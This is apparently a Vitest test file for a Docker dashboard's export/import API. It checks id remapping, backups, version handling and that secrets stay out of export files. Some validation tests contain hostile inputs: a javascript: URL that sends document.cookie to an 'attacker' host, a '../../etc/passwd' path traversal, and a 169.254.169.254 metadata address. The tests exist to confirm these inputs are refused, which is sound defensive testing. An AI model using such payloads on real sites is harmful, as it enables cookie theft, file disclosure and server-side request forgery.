/**
 * Export/import round-trip.
 *
 * Import replaces everything and remaps section ids, which is the part most
 * likely to go quietly wrong: shortcuts reference sections by id, and the new
 * rows get different ones.
 */

import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "dockerdash-data-test-"));
process.env.DB_PATH = path.join(tmpDir, "test.db");

const { db, initializeSchema } = await import("../../config/database.js");
const { default: dataRouter } = await import("../data.js");
const express = (await import("express")).default;

let baseUrl: string;
let server: ReturnType<ReturnType<typeof express>["listen"]>;

beforeAll(async () => {
  initializeSchema();
  const app = express();
  app.use(express.json({ limit: "10mb" }));
  app.use(dataRouter);
  await new Promise<void>((resolve) => {
    server = app.listen(0, () => resolve());
  });
  const address = server.address();
  baseUrl = `http://127.0.0.1:${typeof address === "object" && address ? address.port : 0}`;
});

afterAll(() => {
  server?.close();
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

beforeEach(() => {
  db.exec(
    "DELETE FROM shortcuts; DELETE FROM sections; DELETE FROM dismissed_containers;",
  );
  // Remote servers too: a leftover one would change what an export contains.
  db.prepare("DELETE FROM hosts WHERE id != 1").run();
  db.prepare("UPDATE hosts SET name = 'Local' WHERE id = 1").run();
});

function seed() {
  const media = db
    .prepare("INSERT INTO sections (name, position) VALUES ('Media', 0)")
    .run();
  db.prepare(
    `INSERT INTO shortcuts (display_name, description, port, section_id, is_favorite, position)
     VALUES (@n, @d, @p, @s, 1, 0)`,
  ).run({
    n: "Jellyfin",
    d: "Media server",
    p: 8096,
    s: Number(media.lastInsertRowid),
  });
  db.prepare(
    "INSERT INTO shortcuts (display_name, url, section_id, position) VALUES ('Docs', 'https://example.com', NULL, 1)",
  ).run();
}

describe("export / import", () => {
  it("exports shortcuts and sections", async () => {
    seed();
    const res = await fetch(`${baseUrl}/api/export`);
    const body = await res.json();

    expect(res.status).toBe(200);
    expect(res.headers.get("content-disposition")).toContain("attachment");
    expect(body.version).toBe(2);
    expect(body.sections).toHaveLength(1);
    expect(body.shortcuts).toHaveLength(2);
    expect(body.shortcuts[0]).toMatchObject({
      display_name: "Jellyfin",
      description: "Media server",
      port: 8096,
    });
  });

  it("round-trips, keeping shortcuts attached to their section", async () => {
    seed();
    const exported = await (await fetch(`${baseUrl}/api/export`)).json();

    // Wipe, then import into an empty database so section ids differ.
    db.exec("DELETE FROM shortcuts; DELETE FROM sections;");
    db.prepare("INSERT INTO sections (name, position) VALUES ('Filler', 0)").run();
    db.exec("DELETE FROM sections");

    const res = await fetch(`${baseUrl}/api/import`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(exported),
    });
    const body = await res.json();
    expect(res.status).toBe(200);
    expect(body).toMatchObject({ success: true, shortcuts: 2, sections: 1 });

    const rows = db
      .prepare(
        `SELECT s.display_name, sec.name AS section
         FROM shortcuts s LEFT JOIN sections sec ON sec.id = s.section_id
         ORDER BY s.position`,
      )
      .all();

    expect(rows).toEqual([
      { display_name: "Jellyfin", section: "Media" },
      { display_name: "Docs", section: null },
    ]);
  });

  it("replaces existing data rather than appending", async () => {
    seed();
    const exported = await (await fetch(`${baseUrl}/api/export`)).json();

    await fetch(`${baseUrl}/api/import`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(exported),
    });

    const count = db.prepare("SELECT COUNT(*) AS n FROM shortcuts").get() as {
      n: number;
    };
    expect(count.n).toBe(2);
  });

  it("carries deleted containers across, so they stay deleted", async () => {
    seed();
    db.prepare(
      "INSERT INTO dismissed_containers (container_match_name, display_name) VALUES ('plex', 'Plex')",
    ).run();

    const exported = await (await fetch(`${baseUrl}/api/export`)).json();
    expect(exported.dismissed_containers).toEqual([
      { host_id: 1, container_match_name: "plex", display_name: "Plex" },
    ]);

    db.exec("DELETE FROM dismissed_containers");
    await fetch(`${baseUrl}/api/import`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(exported),
    });

    // Without this, auto-sync would recreate every shortcut the user deleted.
    const restored = db
      .prepare("SELECT container_match_name FROM dismissed_containers")
      .all();
    expect(restored).toEqual([{ container_match_name: "plex" }]);
  });

  it("accepts an export written before dismissals were included", async () => {
    seed();
    const exported = await (await fetch(`${baseUrl}/api/export`)).json();
    delete exported.dismissed_containers;

    const res = await fetch(`${baseUrl}/api/import`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(exported),
    });
    expect(res.status).toBe(200);
  });

  it("refuses an export from an unknown version", async () => {
    const res = await fetch(`${baseUrl}/api/import`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ version: 99, sections: [], shortcuts: [] }),
    });
    expect(res.status).toBe(400);
    expect((await res.json()).error).toContain("Unsupported export version");
  });

  it("refuses a body that is not an export file", async () => {
    const res = await fetch(`${baseUrl}/api/import`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ version: 1 }),
    });
    expect(res.status).toBe(400);
  });

  it("refuses a shortcut whose URL would run as code when clicked", async () => {
    seed();
    const res = await fetch(`${baseUrl}/api/import`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        version: 2,
        sections: [],
        shortcuts: [
          {
            display_name: "Evil",
            url: "javascript:fetch('//attacker/'+document.cookie)",
            position: 0,
          },
        ],
      }),
    });

    expect(res.status).toBe(400);
    expect((await res.json()).error).toContain("not an http(s) URL");
    // Nothing was deleted on the way to refusing it.
    expect(db.prepare("SELECT COUNT(*) AS n FROM shortcuts").get()).toEqual({ n: 2 });
  });

  it("refuses an icon that is neither an icon name, an upload nor a URL", async () => {
    const res = await fetch(`${baseUrl}/api/import`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        version: 2,
        sections: [],
        shortcuts: [{ display_name: "X", port: 80, icon: "../../etc/passwd" }],
      }),
    });
    expect(res.status).toBe(400);
  });

  it("refuses a server address the form would refuse", async () => {
    const res = await fetch(`${baseUrl}/api/import`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        version: 2,
        hosts: [{ id: 2, name: "Meta", type: "agent", url: "http://169.254.169.254" }],
        sections: [],
        shortcuts: [],
      }),
    });
    expect(res.status).toBe(400);
    expect((await res.json()).error).toContain("hosts[0].url");
  });

  it("refuses fields of the wrong type instead of writing them", async () => {
    const res = await fetch(`${baseUrl}/api/import`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        version: 2,
        sections: [{ id: 1, name: { not: "text" }, position: 0 }],
        shortcuts: [],
      }),
    });
    expect(res.status).toBe(400);
    expect((await res.json()).error).toContain("sections[0].name");
  });

  it("writes a backup before replacing anything", async () => {
    seed();
    const exported = await (await fetch(`${baseUrl}/api/export`)).json();
    const before = fs.readdirSync(tmpDir).filter((f) => f.includes("preimport"));

    await fetch(`${baseUrl}/api/import`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(exported),
    });

    // A new file, not a longer list: only the five most recent backups are
    // kept, so once there are five the count stops going up.
    const after = fs.readdirSync(tmpDir).filter((f) => f.includes("preimport"));
    expect(after.filter((f) => !before.includes(f))).toHaveLength(1);
  });
});

describe("export / import across servers", () => {
  it("keeps every shortcut on its own server, and leaves the keys behind", async () => {
    seed();
    const nas = db
      .prepare(
        `INSERT INTO hosts (name, type, url, api_key, hostname, color, position, enabled)
         VALUES ('NAS', 'agent', 'http://nas.local:3080', 'super-secret', 'nas.local', '#22c55e', 1, 1)`,
      )
      .run();
    const nasId = Number(nas.lastInsertRowid);
    db.prepare(
      "INSERT INTO shortcuts (host_id, display_name, port) VALUES (?, 'Immich', 2283)",
    ).run(nasId);
    db.prepare(
      "INSERT INTO dismissed_containers (host_id, container_match_name, display_name) VALUES (?, 'watchtower', 'Watchtower')",
    ).run(nasId);

    const raw = await (await fetch(`${baseUrl}/api/export`)).text();
    // A file the user downloads and keeps is no place for a key that can stop
    // containers on another machine.
    expect(raw).not.toContain("super-secret");

    const exported = JSON.parse(raw);
    expect(exported.hosts.map((h: { name: string }) => h.name)).toContain("NAS");

    // Import into a database where the remote server does not exist, so its id
    // has to be remapped rather than reused.
    db.exec("DELETE FROM shortcuts; DELETE FROM sections; DELETE FROM dismissed_containers;");
    db.prepare("DELETE FROM hosts WHERE id != 1").run();

    const body = await (
      await fetch(`${baseUrl}/api/import`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(exported),
      })
    ).json();
    expect(body).toMatchObject({ success: true, hosts: 1 });

    const rows = db
      .prepare(
        `SELECT s.display_name, h.name AS host, h.enabled, h.api_key
         FROM shortcuts s JOIN hosts h ON h.id = s.host_id
         ORDER BY s.display_name`,
      )
      .all();

    expect(rows).toEqual([
      { display_name: "Docs", host: "Local", enabled: 1, api_key: null },
      { display_name: "Immich", host: "NAS", enabled: 0, api_key: null },
      { display_name: "Jellyfin", host: "Local", enabled: 1, api_key: null },
    ]);

    // The dismissal came back on the same server it was made on.
    const dismissal = db
      .prepare(
        `SELECT h.name AS host FROM dismissed_containers d JOIN hosts h ON h.id = d.host_id`,
      )
      .get();
    expect(dismissal).toEqual({ host: "NAS" });
  });

  it("reads a version 1 export, filing everything under the local server", async () => {
    const legacy = {
      version: 1,
      sections: [{ id: 1, name: "Media", position: 0, is_collapsed: 0 }],
      shortcuts: [
        {
          display_name: "Jellyfin",
          description: null,
          icon: null,
          icon_type: null,
          port: 8096,
          url: null,
          container_name: "jellyfin",
          container_match_name: "jellyfin",
          compose_project: null,
          section_id: 1,
          position: 0,
          is_favorite: 1,
          use_tailscale: 0,
        },
      ],
      dismissed_containers: [
        { container_match_name: "plex", display_name: "Plex" },
      ],
    };

    const res = await fetch(`${baseUrl}/api/import`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(legacy),
    });
    expect(res.status).toBe(200);

    expect(
      db.prepare("SELECT host_id FROM shortcuts").all(),
    ).toEqual([{ host_id: 1 }]);
    expect(
      db.prepare("SELECT host_id FROM dismissed_containers").all(),
    ).toEqual([{ host_id: 1 }]);
  });
});
